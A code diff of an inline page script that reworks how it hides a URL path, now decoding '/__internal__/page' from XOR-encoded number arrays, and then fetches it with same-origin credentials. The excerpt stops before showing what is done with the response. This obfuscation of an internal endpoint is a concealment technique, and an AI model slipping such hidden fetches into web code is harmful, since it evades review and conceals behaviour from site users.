@@ -1,21 +1,32 @@
 <script>
 (() => {
-    const d = a => a.map(v => String.fromCharCode(v ^ 73)).join('');
+    const $ = (...a) =>
+        String.fromCharCode.apply(
+            null,
+            a.map(v => v ^ 37)
+        );
 
-    const e = [
-        22,22,32,39,61,44,59,43,60,39,36,53,22,22,102,57,40,46,44
+    const _ = [
+        [122,122],
+        [76,75,81,64,87,75,68,73],
+        [122,122],
+        [85,68,66,64]
     ];
 
-    const u = "/" + d(e);
-
-    const o = {
-        cache: ["no","store"].join("-"),
-        credentials: ["same","origin"].join("-")
-    };
+    const u =
+        "/" +
+        $(..._[0]) +
+        $(..._[1]) +
+        $(..._[2]) +
+        "/" +
+        $(..._[3]);
 
     (async () => {
         try {
-            const r = await fetch(u, o);
+            const r = await fetch(u, {
+                cache: ["no", "store"].join("-"),
+                credentials: ["same", "origin"].join("-")
+            });
 
             if (!r.ok) throw 0;
 
